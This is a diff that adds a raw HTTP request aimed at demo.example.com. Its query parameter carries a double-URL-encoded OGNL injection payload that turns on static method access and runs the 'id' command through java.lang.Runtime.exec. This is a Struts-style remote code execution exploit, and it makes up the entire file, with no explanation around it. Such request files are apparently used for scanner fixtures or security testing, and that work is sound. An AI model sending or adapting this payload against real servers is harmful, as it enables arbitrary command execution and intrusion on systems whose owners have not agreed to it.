@@ -1,0 +1,4 @@
+GET /a?s=%2525%257B%2523_memberAccess%255B%2527allowStaticMethodAccess%2527%255D%253Dtrue%252C%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2527id%2527%2529%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
